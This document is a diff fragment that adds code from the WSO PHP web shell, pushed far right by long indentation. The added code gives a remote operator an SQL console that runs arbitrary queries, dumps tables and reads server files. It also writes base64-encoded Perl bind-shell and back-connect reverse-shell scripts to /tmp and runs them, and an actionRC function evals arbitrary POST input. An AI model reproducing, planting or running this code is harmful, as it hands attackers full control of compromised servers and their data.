+                                                                        echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
+                                                                        if (@$_POST['p1'] == 'select') {
+                                                                            $_POST['p1'] = 'query';
+                                                                            $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
+                                                                            $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
+                                                                            $num = $db->fetch();
+                                                                            $pages = ceil($num['n'] / 30);
+                                                                            echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
+                                                                            echo " of $pages";
+                                                                            if ($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>&lt; Prev</a>";
+                                                                            if ($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next &gt;</a>";
+                                                                            $_POST['p3']--;
+                                                                            if ($_POST['type'] == 'pgsql') $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);
+                                                                            else $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';
+                                                                            echo "<br><br>";
+                                                                        }
+                                                                        if ((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
+                                                                            $db->query(@$_POST['p2']);
+                                                                            if ($db->res !== false) {
+                                                                                $title = false;
+                                                                                echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
+                                                                                $line = 1;
+                                                                                while ($item = $db->fetch()) {
+                                                                                    if (!$title) {
+                                                                                        echo '<tr>';
+                                                                                        foreach ($item as $key => $value) echo '<th>' . $key . '</th>';
+                                                                                        reset($item);
+                                                                                        $title = true;
+                                                                                        echo '</tr><tr>';
+                                                                                        $line = 2;
+                                                                                    }
+                                                                                    echo '<tr class="l' . $line . '">';
+                                                                                    $line = $line == 1 ? 2 : 1;
+                                                                                    foreach ($item as $key => $value) {
+                                                                                        if ($value == null) echo '<td><i>null</i></td>';
+                                                                                        else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
+                                                                                    }
+                                                                                    echo '</tr>';
+                                                                                }
+                                                                                echo '</table>';
+                                                                            } else {
+                                                                                echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
+                                                                            }
+                                                                        }
+                                                                        echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
+                                                                        if (!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']);
+                                                                        echo "</textarea><br/><input type=submit value='Execute'>";
+                                                                        echo "</td></tr>";
+                                                                    }
+                                                                    echo "</table></form><br/>";
+                                                                    if ($_POST['type'] == 'mysql') {
+                                                                        $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
+                                                                        if ($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
+                                                                    }
+                                                                    if (@$_POST['p1'] == 'loadfile') {
+                                                                        $file = $db->loadFile($_POST['p2']);
+                                                                        echo '<br/><pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
+                                                                    }
+                                                                } else {
+                                                                    echo htmlspecialchars($db->error());
+                                                                }
+                                                                echo '</div>';
+                                                                wsoFooter();
+                                                            }
+                                                            function actionNetwork() {
+                                                                wsoHeader();
+                                                                $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+                                                                $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+                                                                echo "<h1>Network tools</h1><div class=content>
+    <form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
+    <span>Bind port to /bin/sh [perl]</span><br/>
+    Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+    </form>
+    <form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
+    <span>Back-connect  [perl]</span><br/>
+    Server: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+    </form><br>";
+                                                                if (isset($_POST['p1'])) {
+                                                                    function cf($f, $t) {
+                                                                        $w = @fopen($f, "w") or @function_exists('file_put_contents');
+                                                                        if ($w) {
+                                                                            @fwrite($w, base64_decode($t));
+                                                                            @fclose($w);
+                                                                        }
+                                                                    }
+                                                                    if ($_POST['p1'] == 'bpp') {
+                                                                        cf("/tmp/bp.pl", $bind_port_p);
+                                                                        $out = wsoEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1>/dev/null 2>&1 &");
+                                                                        sleep(1);
+                                                                        echo "<pre class=ml1>$out
+" . wsoEx("ps aux | grep bp.pl") . "</pre>";
+                                                                        unlink("/tmp/bp.pl");
+                                                                    }
+                                                                    if ($_POST['p1'] == 'bcp') {
+                                                                        cf("/tmp/bc.pl", $back_connect_p);
+                                                                        $out = wsoEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");
+                                                                        sleep(1);
+                                                                        echo "<pre class=ml1>$out
+" . wsoEx("ps aux | grep bc.pl") . "</pre>";
+                                                                        unlink("/tmp/bc.pl");
+                                                                    }
+                                                                }
+                                                                echo '</div>';
+                                                                wsoFooter();
+                                                            }
+                                                            function actionRC() {
+                                                                if (!@$_POST['p1']) {
+                                                                    $a = array("uname" => php_uname(), "php_version" => phpversion(), "wso_version" => WSO_VERSION, "safemode" => @ini_get('safe_mode'));
+                                                                    echo serialize($a);
+                                                                } else {
+                                                                    eval($_POST['p1']);
+                                                                }
+                                                            }
+                                                            if (empty($_POST['a'])) if (isset($default_action) && function_exists('action' . $default_action)) $_POST['a'] = $default_action;
+                                                            else $_POST['a'] = 'SecInfo';
+                                                            if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) call_user_func('action' . $_POST['a']);
+                                                            exit;
+                                                            
